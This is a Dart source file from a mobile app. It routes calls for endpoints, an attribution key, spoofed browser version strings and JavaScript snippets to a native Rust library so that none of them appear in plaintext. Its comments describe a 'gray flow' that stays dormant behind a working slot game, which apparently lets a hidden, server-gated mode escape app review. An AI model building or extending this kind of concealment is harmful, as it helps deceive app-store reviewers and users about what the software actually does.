// ============================================================
//  sealed_bytes.dart — Dart-side accessors for Rust vault.
// ============================================================
//  No plaintext, no XOR tables, no byte arrays. Each unmaskX()
//  call forwards to libdrift_signal.so via DriftBridge. Keeping
//  the same accessor names means ClientBeacon / VerdictHub
//  / PageHarness need zero changes.
//
//  If libdrift_signal.so is missing or fails to open, every call
//  returns "", which makes ClientDossier.credentialsReady false
//  and keeps the gray flow dormant — the slot game still works.
// ============================================================

import '../curio/drift_bridge.dart';

String unmaskVerdictEndpoint()  => DriftBridge.fetch(DriftSlot.verdictEndpoint);
String unmaskAttributionKey()   => DriftBridge.fetch(DriftSlot.afKey);
String unmaskGcdBase()          => DriftBridge.fetch(DriftSlot.gcdBase);
String unmaskMessagingProject() => DriftBridge.fetch(DriftSlot.firebaseProject);

String unmaskChromeVersion()    => DriftBridge.fetch(DriftSlot.chromeVersion);
String unmaskWebkitVersion()    => DriftBridge.fetch(DriftSlot.webkitVersion);

String unmaskJsSafeArea()       => DriftBridge.fetch(DriftSlot.jsSafeArea);
String unmaskJsKeyboard()       => DriftBridge.fetch(DriftSlot.jsKeyboard);
String unmaskJsAutoplay()       => DriftBridge.fetch(DriftSlot.jsAutoplay);

/// Full GCD call URL assembled inside Rust so the dev key never
/// appears as a Dart String.
String unmaskGcdCallUrl(String appId, String deviceId) =>
    DriftBridge.gcdCallUrl(appId: appId, deviceId: deviceId);
